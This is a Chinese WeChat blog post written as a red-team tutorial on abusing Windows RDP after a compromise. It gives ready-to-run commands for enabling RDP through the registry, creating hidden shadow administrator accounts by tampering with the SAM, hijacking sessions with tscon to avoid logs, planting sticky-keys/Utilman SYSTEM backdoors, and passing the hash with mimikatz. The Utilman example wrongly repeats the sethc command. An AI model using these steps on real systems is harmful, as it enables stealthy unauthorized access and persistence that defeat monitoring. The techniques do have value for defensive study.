> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wVyhi5NV4KZb26N4nS44jQ)

点击蓝字关注我哦

前言

rdp 服务是我们常用的服务，可以不是 3389 端口，可以改成任意端口，时候为了利用它，必须先找出来服务端口，毕竟管理员也鸡贼。

**查看 rdp 服务端口**

```
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
```

得到连接端口为 0xd3d，转换后为 3389

**开启 rdp 服务**

老版本和新版 windows 版本不一样

windows server 2003

```
开启：
REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
关闭：
REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
开启：
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1`
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

windows server 2008

```
开启：
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
```

如果还不行，就防火墙放行 rdp 服务端口，就可以连接了。

  

增加影子用户

**1.1 前言**

在红队活动中，红队人员当拿到一个 windows 服务器往往为了获取更多有用的东西或进行一波操作，会开启 3389，这时候如果当前用户在线，如果用当前的用户账户去连，会把 session 挤掉，容易引起管理员警觉，这时候一般都会去添加用户，把用户提升为管理员权限，这时候添加一个隐藏的用户和克隆管理员用户手法就很重要。

**1.2 实操**

在 windows 中，添加账户名后面加入 $ 符合可以使该用户在命令行中隐藏

例如：

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuC3JRtHfVDIzGfeXwE255AXMYl70tA7gXFTGBgXyWSeum6y4PD5PUOPYqFlAzotUhtiblQSohRslg/640?wx_fmt=png)

我这里添加了一个普通用户，但是用 net user 命令却看不懂此用户。

但实际上确实是存在的

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuC3JRtHfVDIzGfeXwE255AwMibfviaC8Nic49WSKE8balucEJhzrIxfacUqx9ib6v8icibsmCqG2mUsuHQ/640?wx_fmt=png)

但一般的话，我们可以直接更改 guest 用户权限，将会更加隐蔽。  

接下来我们来创建一个影子管理员账户，将更加 nice！

打开注册表，找到 HKEY_LOCAL_MACHINE\SAM\SAM\ 键，右键设置权限：

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuC3JRtHfVDIzGfeXwE255AxWHe1qOpbPvdiaoIlGNeM9JgOkc3bjtVVjq6Wp4ic2JfYXUZdzegTOnQ/640?wx_fmt=png)

因为这里我们需要更改 SAM，但是系统默认只能 system 修改，这里必须改成管理员也能修改才行。

再次打开注册表，查看各个用户的类型值

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuC3JRtHfVDIzGfeXwE255Agibm72WDNXGZkPX5FPQKfaulB35QlAYyXpLLVA3uGcibx1TeY8bII8uQ/640?wx_fmt=png)

发现每个用户的类型值都不一样，而管理员用户和 Guest 用户都是 0X1f 开头的，而这几个键值正好对应着上面的键，选择管理员对应的，把 F 键值复制了  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuC3JRtHfVDIzGfeXwE255AIicgzyRPo1N5SaFxnsxBcT6SoZNxqAic25ib4CFic0nd0lVvcnEuVBJp0g/640?wx_fmt=png)

然后打开 admin$ 用户对应的，粘贴进去，然后保存。  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuC3JRtHfVDIzGfeXwE255AeRv2geicVHEnbZiaU9icBYrEvvwiamPqx11ibSnTKZLIibbXibep6wY8HB3BA/640?wx_fmt=png)

然后把右键 Names 中的 admin$ 和 000003EB 两个目录，选择导出，将注册表导出。

最后一步很重要，为了不让出现在组里面，必须删除用户

```
net user admin$ /del
```

再双击刚才导出的两个注册表，重新注册 admin$ 用户，这样权限也是 administators 影子账户就创建好了。

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODuC3JRtHfVDIzGfeXwE255AiadPt9UnLPWXwmeaqAbbqWK0H2uCadSnV97gAGjfPL13xicH8e4kWhZA/640?wx_fmt=png)

RDP 会话劫持

**2.1 前言**

在我们拿到主机系统权限时，但是我们没有拿到管理员的凭据，增加用户又动静太大，但是我们通过 rdp 连接记录发现，管理员 3 天前（3 天之内吧，前提是没有更改组策略设置以使用户断开 RDP 会话后立即或短期注销，而是使 “断开连接的” 远程桌面会话长时间处于休眠状态）通过 rdp 登陆过此系统，那么我们就可以通过 rdp 劫持的方式，来 “恢复” 先前断开的 RDP 会话，而这种的好处就是攻击者会逃避事件监视器，因为攻击者并没有创建新的会话，而是有效地充当被劫持会话的用户，取而代之，所以日志文件中无法显示会话劫持记录，也记录不到。

**2.2 实操**

远程桌面协议（RDP），为系统管理员提供了一种方便的方法来管理 Windows 系统并帮助用户解决问题。

前提：system 权限可以以无凭据的方式在不同的用户会话之间切换

****2.3** 无密码劫持**

这里我们利用 Windows 自带的 Tscon.exe 程序来进行 RDP 劫持，Tscon.exe 可以使用户可以连接到系统上的其他远程桌面会话，或在不同的会话之间切换。

适用于：

```
Applies to: Windows Server (Semi-Annual Channel), Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012
```

微软介绍：

```
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn283323(v=ws.11)
```

```
tscon {<SessionID> | <SessionName>} [/dest:<SessionName>] [/password:<pw> | /password:*] [/v]
```

实操：  

```
query user 查看所有已连接的RDP用户
```

然后连接到此会话

```
tscon 1#会话id
```

相关工具：https://github.com/bohops/SharpRDPHijack

minikatz 也可以作会话劫持

RDP 后门方法

**粘滞键**

该功能是操作系统内置的可访问性功能，并且可以进行预登录（在登录屏幕上，通过物理控制台或通过远程桌面）。

将 Sethc.exe（粘滞键）设置为生成 cmd.exe，那么 rdp 连接就会拥有一个 system 权限后门

1. 通过安全模式来更改（需要重启，不推荐）

2. 通过注册表来更改，或者手工去系统目录下去改名

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```

然后进入 rdp 连接，连按几次 F5

**Utilman**

和粘滞键完全相同，只是使用了 trojan utilman.exe，在登录屏幕上，按 Windows 键 + U，您将获得一个 cmd.exe 窗口，权限为 SYSTEM。

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```

4.PTH RDP

**4.1 前言**

有时候抓不到明文密码，也想登陆 rdp 服务咋办？这时候就可以 PTH RDP，利用 hash 去认证 rdp 服务。

关于 RDP 协议的参考资料：

```
https://github.com/FreeRDP/FreeRDP/wiki/Reference-Documentation
```

如果使用 hash 远程登录 RDP，服务端需要开启 "Restricted Admin Mode", 在 Windows8.1 和 Windows Server 2012R2 上默认开启，Client 也需要支持 Restricted Admin mode。

**手动修改注册表开启方法**

位置：

```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
```

新建 DWORD 键值 DisableRestrictedAdmin，值为 0，代表开启; 值为 1，代表关闭

```
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f

查看是否已开启

REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"
```

使用 minikatz 来进行 PTH

```
privilege::debug
sekurlsa::pth /user:admin /domain:DESKTOP /ntlm:hash"/run:mstsc.exe /restrictedadmin"
```

**也可以用 Python 实现 (rdp_check.py)**

代码地址：

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/rdp_check.py
```

脚本运行前需要安装 Impacket  

```
rdp_check.py /administrator@192.168.1.1 -hashes:hashes
```

总结

Rdp 爆破就不说了

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

END

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtIZ5VYusLbEoY8iaTjibTWg6AKjAQiahf2fctN4PSdYm2O1Hibr56ia39iaJcxBoe04t4nlYyOmRvCr56Q/640?wx_fmt=gif)

**看完记得点赞，关注哟，爱您！**

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

关注此公众号，回复 "Gamma" 关键字免费领取一套网络安全视频以及相关书籍，公众号内还有收集的常用工具！

  

**在看你就赞赞我！**

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbThXaInFkmyjOOcBoNCXGun5icNbT4mjCjcREA3nMN7G8icS0IKM3ebuLA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTkwLkofibxKKjhEu7Rx8u1P8sibicPkzKmkjjvddDg8vDYxLibe143CwHAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODuKK75wg0AnoibFiaUSRyYlmhIZ0mrzg9WCcWOtyblENWAOdHxx9BWjlJclPlVRxA1gHkkxRpyK2cpg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码关注我们

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码领 hacker 资料，常用工具，以及各种福利

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTnHS31hY5p9FJS6gMfNZcSH2TibPUmiam6ajGW3l43pb0ySLc1FibHmicibw/640?wx_fmt=gif)

转载是一种动力 分享是一种美德